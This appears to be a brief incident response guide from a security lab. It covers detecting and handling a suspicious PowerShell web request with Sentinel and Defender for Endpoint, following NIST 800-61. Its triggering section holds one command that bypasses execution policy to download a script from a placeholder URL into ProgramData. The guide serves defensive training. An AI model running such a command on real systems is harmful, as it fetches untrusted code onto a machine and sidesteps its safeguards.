# Incident Response Guide: PowerShell Suspicious Web Request

## 1. Detection Strategy

Created a Sentinel Alert to identify usage of `Invoke-WebRequest` via PowerShell targeting known untrusted sources.

## 2. Incident Triggering

The following PowerShell commands were executed on `windows-target-1`:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri [script URL] -OutFile C:\programdata\[filename].ps1
```

## 3. Investigation Steps (NIST 800-61)

- **Identification:** Alert from Microsoft Defender for Endpoint.
- **Analysis:** MDE and Sentinel queries confirmed script download and execution.
- **Validation:** Manual review and KQL queries cross-referenced script execution.

## 4. Containment, Eradication & Recovery

- Isolated `windows-target-1` via MDE.
- Performed malware scans (clean).
- System removed from isolation after confirmation.

## 5. Post-Incident Activities

- User awareness training conducted.
- Security policy improved (PowerShell restrictions deployed).
- Awareness training platform upgraded.

## 6. Cleanup Procedures

- Removed downloaded scripts.
- Reviewed related user/system activity logs.
- Refreshed endpoint policy baselines.
